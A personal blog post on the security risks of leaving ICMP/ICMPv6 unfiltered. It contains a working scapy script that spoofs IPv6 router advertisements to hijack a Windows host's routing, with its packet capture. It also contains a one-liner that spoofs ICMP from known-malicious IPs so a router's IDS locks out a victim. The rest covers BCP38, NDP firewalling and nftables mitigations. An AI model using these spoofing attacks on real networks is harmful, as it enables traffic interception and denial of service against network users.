+++
Title = "Should I enable ICMP? (Pt. 1)"
Date = "2023-01-15T23:20:20-0800"
Author = "Paige"
Description = "Some thoughts on my experiences and in response to shouldiblockicmp.com"
cover = "img/og.png"
+++

> Yes!

## hold up...

Awhile ago I read an article called [Should I block ICMP](http://shouldiblockicmp.com)? The sentiment is pretty much in line with my own which is that ICMP is entirely necesarry for a variety of reasons especially in IPv6. Unfortunately my experience tells me that ICMP presents a lot of security problems when left unchecked and it's mostly or entirely left unchecked everywhere I've seen it left on. This will be an attempt to analyze some of the problems and present some insight as to how to mitigate some of the problems.

## IPv6 ND_RA

I have been most interested in this one for awhile. Router advertisements are really useful, but the deployment of IPv6 and it's reception has met with strong resistance and a disjointed comprehension of the theory behind things like router advertisements. Here is an example of how to abuse it using the scapy framework in python:

{{< highlight python >}}
from scapy.all import *
from ipaddress import IPv6Network

sendp((lambda lladdr, llsrc, lldst, prefixlen, prefix: Ether(dst = lldst, src = llsrc) 
/ IPv6(src = lladdr) / ICMPv6ND_RA() / ICMPv6NDOptSrcLLAddr(lladdr = llsrc) / ICMPv6NDOptMTU() 
/ ICMPv6NDOptPrefixInfo(prefixlen=prefixlen, prefix=prefix) / ICMPv6NDOptRouteInfo(prf = 1, plen = 3, 
prefix = "2000::", rtlifetime = 0xffffffff))("fe80::4398:6d2e:c5ca:cb73", "c0:3c:59:ed:e3:1f", 
"9c:b6:d0:3f:72:96", 64, next(IPv6Network("fc00:1d13:f001::/48").subnets(64)).network_address), count = 16)
{{< / highlight >}}

To clarify, this is a router advertisement spoofed as another computer as the source, to a windows machine as it's destination. Here's a complete breakdown of the assumptions and what it does: 

- Is able to send a spoofed ethernet header (mac address spoofing)
- Is able to send unfiltered router advertisements to `ff02::1`
- It relies on the fact that the host that it's being sent to will automatically accept the address that is advertised
(SLAAC)
- The spoofed source mac address is: `c0:3c:59:ed:e3:1f`
- The spoofed layer 3 link local source address is: `fe80::4398:6d2e:c5ca:cb73`
- The destination mac address is: `9c:b6:d0:3f:72:96`
- The destination layer 3 address is: `ff02::1` (Link-Local multicast all-nodes address)
- Both clients are connected to a wireless access point that is connected to a UDM Pro
- The filtering characteristics of the wireless access point are unknown 
- The UDM pro is configured without filtering (no IGMP snooping or ND_RA filtering.)

From the sender's perspective, the pcap of what they're sending will look like this: 

```
 00:00:00.000664 c0:3c:59:ed:e3:1f > 9c:b6:d0:3f:72:96, ethertype IPv6 (0x86dd), length 142: (hlim 255, next-header ICMPv6 (58) payload length: 88) fe80::4398:6d2e:c5ca:cb73 > ff02::1: [icmp6 sum ok] ICMP6, router advertisement, length 88
    hop limit 0, Flags [none], pref high, router lifetime 1800s, reachable time 0ms, retrans timer 0ms
      source link-address option (1), length 8 (1): c0:3c:59:ed:e3:1f
        0x0000:  c03c 59ed e31f
      mtu option (5), length 8 (1):  1280
        0x0000:  0000 0000 0500
      prefix info option (3), length 32 (4): fc00:1d13:f001::/64, Flags [onlink, auto], valid time infinity, pref. time infinity
        0x0000:  40c0 ffff ffff ffff ffff 0000 0000 fc00
        0x0010:  1d13 f001 0000 0000 0000 0000 0000
      route info option (24), length 24 (3):  2000::/3, pref=high, lifetime=infinity
        0x0000:  0308 ffff ffff 2000 0000 0000 0000 0000
        0x0010:  0000 0000 0000
    0x0000:  9cb6 d03f 7296 c03c 59ed e31f 86dd 6000  ...?r..<Y.....`.
    0x0010:  0000 0058 3aff fe80 0000 0000 0000 4398  ...X:.........C.
    0x0020:  6d2e c5ca cb73 ff02 0000 0000 0000 0000  m....s..........
    0x0030:  0000 0000 0001 8600 a2a1 0008 0708 0000  ................
    0x0040:  0000 0000 0000 0101 c03c 59ed e31f 0501  .........<Y.....
    0x0050:  0000 0000 0500 0304 40c0 ffff ffff ffff  ........@.......
    0x0060:  ffff 0000 0000 fc00 1d13 f001 0000 0000  ................
    0x0070:  0000 0000 0000 1803 0308 ffff ffff 2000  ................
    0x0080:  0000 0000 0000 0000 0000 0000 0000       ..............
    ```
```

And the result is it 100% works. The recipient sees essentially the same. Modern Windows 10 and 11 machines with IPv6 enabled will have SLAAC enabled by default. The client has now
configured the delegated prefix `fc00:1d13:f001::/64` for itself and configured `fe80::4398:6d2e:c5ca:cb73` as the gateway for `2000::/3`.

- It might be worth noting that traffic destined for `ff02::1` generally specifies a destination MAC address of [33:33:00:00:00:01](https://en.wikipedia.org/wiki/Multicast_address#Ethernet)

## Thrown under the IDS

UDM pro has some nifty security options for detecting suspicious network activity and locking out specific client or completely locking down the network. It might be possible to influence this behavior by eliciting an ICMP reply from a target to a blacklisted address:

{{< highlight python >}}
curl -s http://rules.emergingthreats.net/blockrules/compromised-ips.txt | shuf | sudo python3 -c 'import sys; 
from scapy.all import *; (lambda z, target, smac, dmac: [sendp(Ether(dst = dmac, src = smac)/IP(src = x.strip(), 
dst = target)/ICMP(id = y - 10000, seq = y - 10000)) for x, y in zip(z, range(10000, 10000 + 
len(z)))])(sys.stdin.readlines(), "192.168.1.12", "ff:ff:ff:ff:ff:ff", "9c:b6:d0:3f:72:96")'
{{< / highlight >}}

- `192.168.1.12` has a MAC address of `9c:b6:d0:3f:72:96` and it is the target of this attack
- Each IP in the compromised-ips.txt is paired with a unique id number (up to 10000 or less if there are fewer than 10000 IP addresses), and a packet is sent for each IP to `192.168.1.12` for each of the addresses as the source address. 
- The client receives this and sends a reply to the spoofed address
- The router receives the reply sent to the malicious address and locks out the client
- This can also be accomplished with TCP SYN causing a client to ACK @ a spoofed address. The same is true for UDP.

## There's a lot to think about 
For internet routers, networks have to implement [BCP38 practices](https://www.ietf.org/rfc/bcp/bcp38.html) to prevent packet spoofing but is often overlooked or in-actionable due to [scalability problems](https://ripe58.ripe.net/content/presentations/bgp-scaling-considerations.pdf). To be fair, the problem arises when a user decides to send a packet with the target of an attack's IP address specified as the source address to a large number of hosts; a small UDP packet it sent with a spoofed address to a destination and the destination sends a much larger response UDP packet to the specified source address--amplification attacks. 

- Global Unicast Addresses (GUAs) in IPv6 are "globally scoped" addresses. 

ISP's cannot delegate a prefix smaller than a `/64`, but even if they did, a `/64` is an incomprehensible amount of address space (18,446,744,073,709,551,616 addresses.) It's actually wasteful to configure each host with a `/64`. Neighbor Discovery Protocol is essential 
to making use of the entire addressable range of a `/64`. Essentially, the router is delegated the `/64`, and leases addresses from this block to clients on a network using DHCPv6 and/or SLAAC. NDP is comprised of ICMPv6 type `133`, `134`, `135`, `136`, `137`. Types `133`, `135`, and `136` must be unrestricted to `fe80::/10` and to the `/64` itself which isn't known until it is delegated by the ISP so this presents a chicken and egg problem for creating firewall rules; unless you can specify [hop count / next hop criteria](https://wiki.nftables.org/wiki-nftables/index.php/Matching_routing_information) for filtering ICMPv6.

GUA addresses are internet routable addresses. This presents a problem for people in terms of adoption of IPv6 because in general people tend to think about security in terms of this world vs. the world. Consequently, the world poeple will create calls for no solution that doesn't solve the problem. I won't say that configuring a firewall on everything is a reasonable solution, but I'm not saying that it isn't either.

Amazon came up with a way to describe a solution to make IPv6 meet half way with the fundamental way that people think about networking security called [Egress-only Gateways](https://docs.aws.amazon.com/vpc/latest/userguide/egress-only-internet-gateway.html). It's not a concept that is unique to Amazon. I'm not aware of a way this can be accomplished with BGP, this is undoubtedly made possible using a stateful firewall which for a lot of people remains a [scalability problem](https://people.netfilter.org/kadlec/nftest.pdf).

The unfortunate truth is that it's [never going to not be a scalability problem](https://en.wikipedia.org/wiki/Time_complexity). But there's a lot you can do now, that you haven't always been able to do with stateful firewalls as I've outlined in my [presentation on NFTables](https://paige.bio/nftables_presentation) such as [Flowtables](https://wiki.nftables.org/wiki-nftables/index.php/Flowtables). Another fantastic advantage of NFTables is the flexibility of the language itself to better realize the complexities of stateful queuing and measuring traffic as well as dynamically making adjustments based on measured traffic. 

For [part 2](/posts/icmp_pt2/), I'd like to cover some of the lesser known aspects of ICMP. Things like admin-prohibited and what they should mean but also why it's not as simple as just letting it be a REJECT as well as ways you can counter abuse. This is a topic I've been wanting to cover for a long time, but it's going to take awhile. 
